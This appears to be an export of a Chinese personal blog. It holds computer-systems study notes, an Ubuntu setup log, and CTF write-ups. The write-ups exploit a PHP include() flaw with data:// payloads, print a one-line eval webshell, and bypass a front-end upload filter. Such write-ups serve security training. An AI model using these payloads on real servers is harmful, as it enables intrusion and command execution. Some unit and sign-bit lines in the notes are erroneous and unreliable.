<h4 id="进位计数制"><a href="#进位计数制" class="headerlink" title="进位计数制"></a>进位计数制</h4><p>十进制、二进制、十六进制、八进制及其相互转换</p>
<h4 id="定-浮点数表示-解决小数点问题"><a href="#定-浮点数表示-解决小数点问题" class="headerlink" title="定&#x2F;浮点数表示(解决小数点问题)"></a>定&#x2F;浮点数表示(解决小数点问题)</h4><ul>
<li>定点整数、定点小数</li>
<li>浮点数(可用一个定点小数和一个定点整数来表示)</li>
</ul>
<h4 id="定点数的编码-解决正负号问题"><a href="#定点数的编码-解决正负号问题" class="headerlink" title="定点数的编码(解决正负号问题)"></a>定点数的编码(解决正负号问题)</h4><ul>
<li>原码、补码、反码、移码</li>
</ul>
<h3 id="R进制计数制"><a href="#R进制计数制" class="headerlink" title="R进制计数制"></a>R进制计数制</h3><p>R进制有R个基本符号(0~R-1),采用”逢R进一”的运算规则，对于每个数位i，该位上的权为Ri, R被称为该数字系统的基。</p>
<h3 id="R进制表示法"><a href="#R进制表示法" class="headerlink" title="R进制表示法"></a>R进制表示法</h3><p>二进制：Binary(<strong>以0b或者0B开头</strong>)</p>
<p>八进制：Octal(<strong>以”0”开头</strong>)</p>
<p>十进制：Decimal</p>
<p>十六进制：Hexadecimal(<strong>以”0x”开头或者以”H”为后缀</strong>)</p>
<h3 id="十进制数与R进制数之间的转换"><a href="#十进制数与R进制数之间的转换" class="headerlink" title="十进制数与R进制数之间的转换"></a>十进制数与R进制数之间的转换</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/07/202207102008131.png"
                      alt="image-20220710200812070"
                ></p>
<p>从低位到高位每3位二进制数可表示一位八进制数、每4位二进制数可表示一位十六进制数，高位补零</p>
<h2 id="定点数和浮点数"><a href="#定点数和浮点数" class="headerlink" title="定点数和浮点数"></a>定点数和浮点数</h2><p>定点数：小数点位置约定在固定位置的数称为<strong>定点数</strong></p>
<p>浮点数：小数点位置约定为可浮动的数称为<strong>浮点数</strong></p>
<p>​ 浮点数的<strong>尾数</strong>部分为定点小数，整数部分为<strong>带符号整数</strong>或者<strong>无符号整数</strong></p>
<p>​ 任何实数X&#x3D;(-1)S * M * RE,其中S取0&#x2F;1，用来确定X的符号；M是一个二进制定点小数，称为X的<strong>尾数</strong>;E是一个二进制定点整数，称为X的<strong>阶或指数</strong>；R是基数。</p>
<h2 id="原码、补码、反码、移码"><a href="#原码、补码、反码、移码" class="headerlink" title="原码、补码、反码、移码"></a>原码、补码、反码、移码</h2><p><strong>原码</strong>的表示与机器数真值表示的一样，即用第一位表示符号(0为整数，1为负数)，其余位表示数值<br>如果用原码表示，让符号位也参与计算，对于减法来说，结果是不正确的。这也是计算机内部在存储数据时不使用原码的原因，为了解决这一问题，出现了反码。<br><strong>反码</strong>的表示方法为：正数的反码是其原码本身。负数的反码是在其原码的基础上，符号位不变，其余各位取反<br>通过计算我们发现用反码计算减法，结果的真值部分是正确的。而唯一的问题出现在”0”这个特殊的数值上，虽然人们理解上**+0和-0**是一样的，但是0带符号是没有任何意义的，而且会有[0000 0000]原和[1000 0000]原两个编码表示0。为了解决这一问题，出现了补码。<br><strong>补码</strong>的表示方法为正数的补码是其原码本身。负数的补码是在其原码的基础上，符号位不变，其余各位取反后加1（即在反码的基础上加1）。<br>为了方便浮点数进行加减运算时的对阶操作<br><strong>移码</strong>的表示方法为将每一个数值加上一个偏置常数(Excess&#x2F;bias)，通常当编码位数为n时，bias取2n-1或2n-1-1，当bias取2n-1时，移码为补码的高位加一。</p>
<h2 id="补码-模运算"><a href="#补码-模运算" class="headerlink" title="补码-模运算"></a>补码-模运算</h2><p>概念：在一个模运算系统中，一个数与它除以”模”后的余数等价<br>结论：</p>
<ul>
<li>1、一个负数的补码等于**<em>模减该负数的绝对值</em>**</li>
<li>2、对于某一确定的模，某数减去小于模的另一数，总可以用该数加上另一数负数的补码来代替。</li>
</ul>
<p>补码：[X]补=2n+X (-2n&lt;&#x3D;X &lt;2n, mod 2n), X是真值，[X]补是机器数</p>
<h2 id="变形补码"><a href="#变形补码" class="headerlink" title="变形补码"></a>变形补码</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/07/202207102059313.png"
                      alt="image-20220710205902259"
                ></p>
<h2 id="无符号整数"><a href="#无符号整数" class="headerlink" title="无符号整数"></a>无符号整数</h2><p>分为高到低位从左到右排列或从右到左排列，用LSB(Least Significant Bit)来表示最低有效位,用MSB来表示最高有效位，无符号位</p>
<h2 id="带符号整数"><a href="#带符号整数" class="headerlink" title="带符号整数"></a>带符号整数</h2><p>MSB为符号位，可用原码、移码、补码来表示</p>
<p>通常使用补码来表示带符号数：</p>
<p>​ 补码运算系统是模运算系统，加减运算统一</p>
<p>​ 数0的表示唯一，方便使用</p>
<p>​ 比原码多表示一个最小负数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/07/202207102109544.png"
                      alt="image-20220710210915496"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/07/202207102110475.png"
                      alt="image-20220710211048433"
                ></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>计算机系统</tag>
        <tag>信息编码</tag>
        <tag>原码</tag>
        <tag>反码</tag>
        <tag>模</tag>
        <tag>浮点数</tag>
        <tag>移码</tag>
        <tag>补码</tag>
        <tag>进制转换</tag>
      </tags>
  </entry>
  <entry>
    <title>[学习笔记]计算机系统学习笔记Week2-1</title>
    <url>/2022/07/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week2-1/</url>
    <content><![CDATA[<h2 id="浮点数的规格化表示"><a href="#浮点数的规格化表示" class="headerlink" title="浮点数的规格化表示"></a>浮点数的规格化表示</h2><p>规定尾数首位为1</p>
<h3 id="IEEE-754标准"><a href="#IEEE-754标准" class="headerlink" title="IEEE 754标准"></a>IEEE 754标准</h3><h4 id="32位-单精度"><a href="#32位-单精度" class="headerlink" title="32位(单精度)"></a>32位(单精度)</h4><p>1位符号位+8位阶码+23位尾数(其中尾数第一位总为1，因此可以省一位)</p>
<h4 id="64位-双精度"><a href="#64位-双精度" class="headerlink" title="64位(双精度)"></a>64位(双精度)</h4><p>1位符号位+11位阶码+52位尾数(其中尾数第一位总为1，因此可以省一位)</p>
<h4 id="特殊数的表示"><a href="#特殊数的表示" class="headerlink" title="特殊数的表示"></a>特殊数的表示</h4><h5 id="0"><a href="#0" class="headerlink" title="0"></a>0</h5><p><strong>阶码和尾数全部为0</strong>，符号位为1表示-0，为0表示+0</p>
<h5 id="∞和-∞"><a href="#∞和-∞" class="headerlink" title="+∞和-∞"></a>+∞和-∞</h5><p><strong>阶码全为1</strong>，<strong>尾码全为0</strong>，符号位表示正负</p>
<p>注：浮点数除以0不会发生异常，而是会得到无穷， X&#x2F;0&gt;Y，X,Y&gt;0</p>
<h5 id="NaN-Not-a-Number-非数"><a href="#NaN-Not-a-Number-非数" class="headerlink" title="NaN(Not a Number)非数"></a>NaN(Not a Number)非数</h5><p>阶码全为1，尾数不为0</p>
<p>例：sqrt(-4.0)&#x3D;NaN</p>
<h5 id="规格化数"><a href="#规格化数" class="headerlink" title="规格化数"></a>规格化数</h5><p>阶码为1-254，尾数任意</p>
<h5 id="非规格化数"><a href="#非规格化数" class="headerlink" title="非规格化数"></a>非规格化数</h5><p>阶码全为0，尾数不为0</p>
<h2 id="逻辑数据的表示"><a href="#逻辑数据的表示" class="headerlink" title="逻辑数据的表示"></a>逻辑数据的表示</h2><p>逻辑值:真&#x2F;假</p>
<h3 id="表示"><a href="#表示" class="headerlink" title="表示"></a>表示</h3><p>用一位表示。N位二进制数可表示N个逻辑数据</p>
<h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><p>按位进行</p>
<h3 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h3><p>在形式上与其他数据并无差别，需要通过指令来识别</p>
<h2 id="西文数据的表示"><a href="#西文数据的表示" class="headerlink" title="西文数据的表示"></a>西文数据的表示</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
<li>是一种拼音文字，用有限几个字母可拼写出所有单词</li>
<li>只需对有限个字母和数学符号、标点符号等辅助字符编码</li>
<li>所有字符总数不超过256个，使用7或8个二进位可表示</li>
</ul>
<h3 id="表示-1"><a href="#表示-1" class="headerlink" title="表示"></a>表示</h3><p>常用7位ASCII码来表示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://www.runoob.com/wp-content/uploads/2022/03/ascii-1-1.png"
                      alt="img"
                ></p>
<h2 id="汉字及国际字符数据的表示"><a href="#汉字及国际字符数据的表示" class="headerlink" title="汉字及国际字符数据的表示"></a>汉字及国际字符数据的表示</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>汉字是表意文字，一个字就是一个方块图形。 汉字数量巨大，总数超过6万字，给汉字在计算机内部的表示、汉字的传输与交换、汉字的输入和输出等带来了一系列问题。</p>
<h3 id="编码形式"><a href="#编码形式" class="headerlink" title="编码形式"></a>编码形式</h3><p><strong>输入码</strong>∶对汉字用相应按键进行编码表示，用于输入</p>
<p><strong>内码</strong>:用于在系统中进行存储、查找、传送等处理 <strong>字模点阵或轮廓描述</strong>:描述汉字字模点阵或轮廓，用于显示&#x2F;打印</p>
<h4 id="GB2312国标码"><a href="#GB2312国标码" class="headerlink" title="GB2312国标码"></a>GB2312国标码</h4><p>GB2312区位码由码表的行和列组成，各占七位，在行和列前面加个0便组成了两个字节，将每个字节的最高位置为”1”来区分ASCII码。</p>
<h2 id="多媒体信息的表示"><a href="#多媒体信息的表示" class="headerlink" title="多媒体信息的表示"></a>多媒体信息的表示</h2><p><strong>图形</strong>用构建图形的直线或曲线的坐标点及控制点来描述，而这些坐标点或控制点则用数值数据描述 <strong>图像</strong>用构成图像的点(像素)的亮度、颜色或灰度等信息来描述，这些亮度或颜色等值则用数值数据描述 <strong>音频</strong>信息通过对模拟声音进行采样、量化(用二进制编码）来获得，因此量化后得到的是一个数值数据序列（随时间变化)</p>
<p><strong>视频</strong>信息描述的是随时间变化的图像(每一幅图像称为一帧)</p>
<p><strong>音乐</strong>信息(MIDI)通过对演奏的乐器、乐谱等相关的各类信息用0和1进行编码来描述</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>计算机系统</tag>
        <tag>浮点数</tag>
        <tag>ASCII</tag>
        <tag>IEEE</tag>
      </tags>
  </entry>
  <entry>
    <title>[学习笔记]计算机系统学习笔记Week2-2</title>
    <url>/2022/07/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0week2-2/</url>
    <content><![CDATA[<h2 id="数据宽度及其单位"><a href="#数据宽度及其单位" class="headerlink" title="数据宽度及其单位"></a>数据宽度及其单位</h2><h3 id="比特-bit、位、b"><a href="#比特-bit、位、b" class="headerlink" title="比特(bit、位、b)"></a>比特(bit、位、b)</h3><p>计算机中处理、储存数据的最小单位</p>
<h3 id="字节-Byte、B"><a href="#字节-Byte、B" class="headerlink" title="字节(Byte、B)"></a>字节(Byte、B)</h3><p>二进制信息的基本计量单位</p>
<h3 id="字长"><a href="#字长" class="headerlink" title="字长"></a>字长</h3><p>数据通路的宽度，即计算机中总线、ALU位数等的宽度</p>
<h3 id="字-word"><a href="#字-word" class="headerlink" title="字(word)"></a>字(word)</h3><p>表示被处理信息的单位，用来度量数据类型的宽度</p>
<h3 id="千字节-KB"><a href="#千字节-KB" class="headerlink" title="千字节(KB)"></a>千字节(KB)</h3><p>1KB&#x3D;210字节&#x3D;1024B</p>
<h3 id="兆字节-MB"><a href="#兆字节-MB" class="headerlink" title="兆字节(MB)"></a>兆字节(MB)</h3><p>1KB&#x3D;220字节&#x3D;1024KB</p>
<h3 id="千兆字节-GB"><a href="#千兆字节-GB" class="headerlink" title="千兆字节(GB)"></a>千兆字节(GB)</h3><p>1KB&#x3D;230字节&#x3D;1024MB</p>
<h3 id="兆兆字节-TB"><a href="#兆兆字节-TB" class="headerlink" title="兆兆字节(TB)"></a>兆兆字节(TB)</h3><p>1KB&#x3D;240字节&#x3D;1024GB</p>
<h2 id="程序中数据类型的宽度"><a href="#程序中数据类型的宽度" class="headerlink" title="程序中数据类型的宽度"></a>程序中数据类型的宽度</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2022/07/202207182257984.png"
                      alt="image-20220718225729884"
                ></p>
<p><strong>注</strong>：同类型数据并不是所有机器都采用相同的宽度，分配的字节数险随ISA、机器字长和编译器的不同而不同。<br>例如，ANSI C标准未规定long double的确切精度，所以对于不同平台有不同的实现。有的是8字节，有的是10字节，有的是12字节或16字节。</p>
<h2 id="数据的储存和排列顺序"><a href="#数据的储存和排列顺序" class="headerlink" title="数据的储存和排列顺序"></a>数据的储存和排列顺序</h2><h3 id="存放顺序"><a href="#存放顺序" class="headerlink" title="存放顺序"></a>存放顺序</h3><h4 id="大端方式"><a href="#大端方式" class="headerlink" title="大端方式"></a>大端方式</h4><p>最高有效字节放在地址起点，即MSB为访问地址</p>
<h4 id="小端方式"><a href="#小端方式" class="headerlink" title="小端方式"></a>小端方式</h4><p>最低有效字节放在地址起点，即LSB为访问地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://image.txgde.space/2022/07/202207182305076.png"
                      alt="image-20220718230541035"
                ></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>计算机系统</tag>
        <tag>大端</tag>
        <tag>小端</tag>
        <tag>数据宽度</tag>
      </tags>
  </entry>
  <entry>
    <title>折腾 Ubuntu 随记</title>
    <url>/2022/12/27/%E6%8A%98%E8%85%BE%20Ubuntu%20%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>狂推<a class="link"   href="https://wiki.archlinuxcn.org/" >Arch Wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Ubuntu-22-10-Gnome43-5"><a href="#Ubuntu-22-10-Gnome43-5" class="headerlink" title="Ubuntu 22.10  Gnome43.5"></a>Ubuntu 22.10  Gnome43.5</h3><h4 id="Gnome插件-官网-："><a href="#Gnome插件-官网-：" class="headerlink" title="Gnome插件(官网)："></a>Gnome插件<a class="link"   href="https://extensions.gnome.org/" >(官网) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</h4><p>首先安装gnome-shell和gnome-shell-extension<br>插件列表</p>
<ul>
<li>*Clipboard Indicator ：剪切板历史</li>
<li>Media Controls ： 音频控制</li>
<li>Transparent Top Bar(Adjustable transparency) ：Top栏透明</li>
<li>Fildem global menu ：全局菜单</li>
</ul>
<h4 id="软件支持"><a href="#软件支持" class="headerlink" title="软件支持"></a>软件支持</h4><h5 id="应用商店"><a href="#应用商店" class="headerlink" title="应用商店"></a>应用商店</h5><ul>
<li>星火应用商店(gui只能运行在x11下，wayland不能运行):<a class="link"   href="https://spark-app.store/" >https://spark-app.store/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Flatpak:<a class="link"   href="https://flatpak.org/setup/Ubuntu" >https://flatpak.org/setup/Ubuntu <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p>微信：<a class="link"   href="https://github.com/zq1997/deepin-wine" >deepin wine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>(目前感觉最好用的)<br>原神：lutris+dawn<br>steam：设置-steam play</p>
<h5 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h5><p>xdorid(首选)<br>waydroid(很快，但是x86的Android软件支持差，且需要运行在wayland下，需要折腾)</p>
<h4 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h4><h5 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h5><pre><code>oh-my-zsh：
    主题：powerlevel10k
    插件：
</code></pre>
<h4 id="mp4壁纸"><a href="#mp4壁纸" class="headerlink" title="mp4壁纸"></a>mp4壁纸</h4><p>使用xwinwrap<br>可使用该项目进行快捷配置<a class="link"   href="https://github.com/ghostlexly/gpu-video-wallpaper" >video-wallpaper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="罗技鼠标侧键的映射"><a href="#罗技鼠标侧键的映射" class="headerlink" title="罗技鼠标侧键的映射"></a>罗技鼠标侧键的映射</h4><ol>
<li>安装<a class="link"   href="https://github.com/PixlOne/logiops" >Logiops <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br> <code>sudo apt install logiops</code></li>
<li>检查键位devce id<br> <code>logid -v</code></li>
<li>修改配置文件(<a class="link"   href="https://github.com/PixlOne/logiops/wiki/Configuration" >教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,<a class="link"   href="https://github.com/PixlOne/logiops/blob/master/logid.example.cfg" >示例 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,<a class="link"   href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h" >输入事件表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br> <code>vim /etc/logid.cfg</code></li>
<li>创建service或重载service<br> <code>sudo systemctl xxx logid</code></li>
</ol>
<h4 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h4><ul>
<li>Launcher中的项目存放在~&#x2F;.local&#x2F;share&#x2F;applications或&#x2F;usr&#x2F;share&#x2F;applications中</li>
<li>login时执行命令可写在~&#x2F;.profile中</li>
<li>切换x11和wayland： 取消自动登录，在输入密码界面的右下角的设置图标可以进行切换</li>
</ul>
]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>个性化</tag>
      </tags>
  </entry>
  <entry>
    <title>[攻防世界]Web_php_include</title>
    <url>/2021/09/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb_php_include/</url>
    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源:"></a><strong>题目来源:</strong></h2><p><a class="link"   href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1" >攻防世界&gt;&gt;答题&gt;&gt;Web&gt;&gt;高手进阶区&gt;&gt;Web_php_include <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识:"></a><strong>前置知识:</strong></h2><p>PHP include()与php伪协议: <a class="link"   href="https://segmentfault.com/a/1190000018991087" >PHP伪协议总结 - SegmentFault 思否 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>PHP strstr(): <code>strstr(string $haystack, [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) $needle, bool $before_needle = false)</code>查找$needle在$haystack中的首次出现,返回值为字符串或0(未查找到结果)。 [su_highlight]注意该函数区分大小写[&#x2F;su_highlight] 。 <a class="link"   href="https://www.php.net/manual/zh/function.strstr.php" >详细文档&gt;&gt; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>PHP str_replace(): 字符串替换。<a class="link"   href="https://www.php.net/manual/zh/function.str-replace.php" >详细文档&gt;&gt; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp:"></a><strong>WriteUp:</strong></h2><p>打开链接访问网页,发现显示以下代码:</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>分析代码:</p>
<p>通过GET请求发送<code>hello</code>和<code>page</code>给服务器,<code>hello</code>会被<code>echo</code>语句输出出来,<code>page</code>会传给<code>$page</code>变量,<code>$page</code>变量中的<code>php://</code> 被过滤掉后传到<code>include($page);</code>语句当中。</p>
<p>首先我们先扫描常用的php页面:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/image.png"
                      alt="001"
                ></p>
<p>发现可以访问phpinfo.php,因为可以通过GET请求控制<code>include($page)</code>这个语句的执行内容,因此猜想可以通过伪协议来执行php语句,前往phpinfo.php页面查看是否满足条件:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/image-1-1024x245.png"
                      alt="002"
                ></p>
<p>发现<code>allow_url_fopen</code>与 <code>allow_url_ include</code>的值都为on,满足伪协议的条件。</p>
<p>这里我选择了date:&#x2F;&#x2F;这个伪协议</p>
<p>date:&#x2F;&#x2F;伪协议的用法:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;语句&gt;</span><br><span class="line">data://text/plain,base64,&lt;语句(需base64加密)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>构造<code>?page=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;</code>的GET请求(注意URL转码)发送:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/image-2.png"
                      alt="003"
                ></p>
<p>发现fl4gisisish3r3.php文件,再次构造<code>?page=data://text/plain,&lt;?php show_source(&quot;fl4gisisish3r3.php&quot;)?&gt;</code>输出该文件的源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/image-3-1024x595.png"
                      alt="004"
                ></p>
<p>得到flag(注意:若使用cat fl4gisisish3r3.php的方式查看flag需要在网页源代码里才能看到,页面不直接显示)</p>
<hr>
<p>做这道题时我还有一些其他思路,比如利用strstr()大小写敏感来防止php:&#x2F;&#x2F;伪协议被过滤。而且我感觉hello这个GET请求应该也可以利用拿到flag,不过目前我对php的了解还不够多,想不到什么办法,不过网上有很多dalao利用了这个hello。这次就先写这一个方法吧,有空研究研究继续写</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>Medium</tag>
        <tag>PHP</tag>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>[题型总结 &amp; CTFHub]上传文件</title>
    <url>/2021/10/05/%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93-ctfhub%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>通过一些手段绕过拦截验证机制上传一句话木马文件(Webshell)到目标服务器并且能成功访问它,然后向其发送请求执行我们要执行的命令.</p>
<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul>
<li>能够将木马成功上传到目标服务器</li>
<li>能够找到上传的木马文件,并成功访问</li>
<li>一句话木马中的函数能够成功运行</li>
</ul>
<h6 id="一句话木马示例"><a href="#一句话木马示例" class="headerlink" title="一句话木马示例"></a>一句话木马示例</h6><p>以PHP为例: <code>&lt;?php @eval($_POST(&quot;shell&quot;)); ?&gt;</code> (@的作用是不显示错误信息,以免被人发现)</p>
<h2 id="CTFHub技能树中例题"><a href="#CTFHub技能树中例题" class="headerlink" title="CTFHub技能树中例题"></a>CTFHub技能树中例题</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>直接上传一句话木马即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-2.png"
                      alt="001"
                ></p>
<p>bebebe</p>
<p>访问该文件并通过POST请求发送命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-3.png"
                      alt="002"
                ></p>
<p>经过列出目录命令发现在..&#x2F;里有flag_301433253.php文件</p>
<p>通过show_source()函数输出flag_301433253.php的内容获取flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-4.png"
                      alt="003"
                ></p>
<p>后面几个例题就主要说说怎么绕过验证</p>
<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>打开题目所给链接,查看元素发现以下javascript代码:</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">function</span> <span class="title function_">checkfilesuffix</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> file=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请添加上传文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file_suffix=file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(whitelist.<span class="title function_">indexOf</span>(file_suffix) == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;该文件不允许上传&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>这段函数的作用是判断文件后缀名是否为<code>.jpg</code> <code>.png</code> <code>.gif</code> , 不是的话返回<code>false</code>上传失败. 不过好在这个验证程序是写在前端的,我们可以在前端直接对这段函数进行操作.</p>
<p>我们将这段函数中 <code>alert(&quot;该文件不允许上传&quot;);</code> 后的<code>return false;</code> 改成<code>return true;</code> ,然后复制修改过后的函数到控制台回车运行,如图:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-5.png"
                      alt="005"
                ></p>
<p>然后上传我们的一句话木马,在弹出”该文件不允许上传”后又会弹出”上传成功”.</p>
<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>打开题目所给链接,查看元素发现以下被注释掉的javascript代码,根据题目猜想是目标服务器通过.htaccess实现了下列函数的功能</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">empty</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    $name = <span class="title function_">basename</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $ext = <span class="title function_">pathinfo</span>($name)[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    $blacklist = <span class="title function_">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php7&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span 